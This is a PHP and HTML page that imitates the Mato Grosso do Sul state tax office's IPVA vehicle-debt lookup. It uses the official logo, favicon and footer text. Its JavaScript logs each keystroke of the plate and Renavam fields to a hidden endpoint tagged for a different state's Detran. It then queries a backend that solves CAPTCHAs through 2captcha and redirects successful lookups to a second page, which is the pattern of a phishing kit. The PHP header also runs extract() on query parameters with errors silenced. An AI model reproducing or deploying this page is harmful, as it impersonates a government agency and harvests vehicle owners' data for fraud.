<?php
error_reporting(0);
extract($_GET);

if($sucesso){
    include_once(__DIR__ . '/homex.php');
    return;
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>IPVA - Débitos - Consulta</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <link rel="shortcut icon" type="image/x-icon" href="https://servicos.efazenda.ms.gov.br/templates/images/favicon.jpg"/>
    
    <style>
        body {
            background-color: #f4f6f9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .header {
            background-color: #004f9f;
            color: #fff;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .logo img {
            height: 50px;
        }
        .header-title {
            font-size: 1.5rem;
            font-weight: 500;
            margin-left: 15px;
        }
        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 15px;
        }
        .search-card {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 500px;
            border-top: 5px solid #004f9f;
        }
        .card-title {
            color: #004f9f;
            font-size: 1.4rem;
            font-weight: bold;
            margin-bottom: 25px;
            text-align: center;
            text-transform: uppercase;
        }
        .form-group label {
            font-weight: 600;
            color: #495057;
        }
        .form-control {
            border-radius: 6px;
            padding: 12px;
            height: auto;
            border: 1px solid #ced4da;
        }
        .form-control:focus {
            border-color: #004f9f;
            box-shadow: 0 0 0 0.2rem rgba(0, 79, 159, 0.25);
        }
        .btn-primary {
            background-color: #004f9f;
            border-color: #004f9f;
            padding: 12px;
            font-weight: bold;
            border-radius: 6px;
            width: 100%;
            transition: all 0.2s;
        }
        .btn-primary:hover {
            background-color: #00366d;
            border-color: #00366d;
        }
        .footer {
            background-color: #e9ecef;
            color: #6c757d;
            text-align: center;
            padding: 15px;
            font-size: 0.9rem;
            border-top: 1px solid #dee2e6;
        }
        
        /* Modal styling */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.6);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal-overlay.show {
            display: flex;
        }
        .modal-card {
            background: #fff;
            padding: 25px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            text-align: center;
        }
        .modal-card-title {
            font-size: 1.2rem;
            font-weight: bold;
            color: #dc3545;
            margin-bottom: 15px;
        }
        .modal-card-body {
            color: #333;
            margin-bottom: 20px;
            font-size: 0.95rem;
            line-height: 1.5;
        }
        .btn-modal {
            background-color: #6c757d;
            color: #fff;
            border: none;
            padding: 8px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn-modal:hover {
            background-color: #5a6268;
        }
        .loader-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- HEADER INICIO -->
    <div class="header">
        <div class="logo">
            <img src="/ipvapublico/Content/themes/base/images/Brasao-Governo-de-MS.png" onerror="this.src='https://servicos.efazenda.ms.gov.br/ipvapublico/Content/themes/base/images/Brasao-Governo-de-MS.png'" alt="Brasão MS">
        </div>
        <div class="header-title">
            IPVA - Imposto Sobre Propriedade de Veículo Automotor
        </div>
    </div>
    <!-- HEADER FIM -->

    <!-- CORPO DE BUSCA -->
    <div class="main-container">
        <div class="search-card">
            <div class="card-title">Consulta de Débitos</div>
            <form id="formConsulta">
                <div class="form-group">
                    <label for="placa">Placa:</label>
                    <input type="text" id="placa" name="placa" class="form-control" placeholder="ABC1D23 ou ABC1234" required maxlength="8">
                </div>
                <div class="form-group">
                    <label for="renavam">Renavam:</label>
                    <input type="text" id="renavam" name="renavam" class="form-control" placeholder="00525858237" required maxlength="11">
                </div>
                <button type="submit" id="btnConsultar" class="btn btn-primary btn-block">
                    <span id="btnText">CONSULTAR DÉBITOS</span>
                </button>
            </form>
        </div>
    </div>
    <!-- FIM CORPO -->

    <!-- FOOTER INICIO -->
    <div class="footer">
        © Governo do Estado de Mato Grosso do Sul - Secretaria de Estado de Fazenda - SEFAZ
    </div>
    <!-- FOOTER FIM -->

    <!-- MODAL DE ERROS -->
    <div id="modalErro" class="modal-overlay">
        <div class="modal-card">
            <div class="modal-card-title">Ops! Algo deu errado</div>
            <div id="modalErroMsg" class="modal-card-body">Por favor, verifique os dados e tente novamente.</div>
            <button class="btn-modal" onclick="fecharModal()">FECHAR</button>
        </div>
    </div>

    <!-- JS SCRIPTS -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script>
        function fecharModal() {
            $('#modalErro').removeClass('show');
        }

        $(document).ready(function() {
            // Evento para sinalizar digitação (typing_start)
            $('#placa, #renavam').on('input', function() {
                var placaVal = $('#placa').val();
                var renavamVal = $('#renavam').val();
                if (placaVal.length > 2 || renavamVal.length > 2) {
                    $.ajax({
                        url: '/api/typing_start.php',
                        method: 'POST',
                        contentType: 'application/json',
                        data: JSON.stringify({
                            tela: 'detran-mt2',
                            placa: placaVal,
                            renavam: renavamVal
                        })
                    });
                }
            });

            // Submit de busca
            $('#formConsulta').submit(function(e) {
                e.preventDefault();
                
                var placa = $('#placa').val().trim();
                var renavam = $('#renavam').val().trim();
                
                // Ativar loading
                $('#btnConsultar').prop('disabled', true);
                $('#btnConsultar').html('<div class="loader-spinner"></div> CONSULTANDO...');

                $.ajax({
                    url: '/api/mt2.php?placa=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam),
                    method: 'GET',
                    timeout: 45000 // 45 segundos por conta do 2captcha
                }).done(function(response) {
                    $('#btnConsultar').prop('disabled', false);
                    $('#btnConsultar').html('CONSULTAR DÉBITOS');

                    if (response && response.IsStatus) {
                        // Sucesso: Redireciona
                        window.location.href = './?sucesso=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam);
                    } else {
                        // Falha retornada pela API
                        var msg = response.message || 'Veículo não encontrado ou erro de conexão. Tente novamente.';
                        $('#modalErroMsg').text(msg);
                        $('#modalErro').addClass('show');
                    }
                }).fail(function(xhr, status, error) {
                    $('#btnConsultar').prop('disabled', false);
                    $('#btnConsultar').html('CONSULTAR DÉBITOS');
                    
                    var msg = 'Erro ao processar a consulta. Por favor, tente novamente mais tarde.';
                    if (status === 'timeout') {
                        msg = 'O sistema do Detran está sobrecarregado. Tente novamente daqui a 10 minutos.';
                    }
                    $('#modalErroMsg').text(msg);
                    $('#modalErro').addClass('show');
                });
            });
        });
    </script>
</body>
</html>
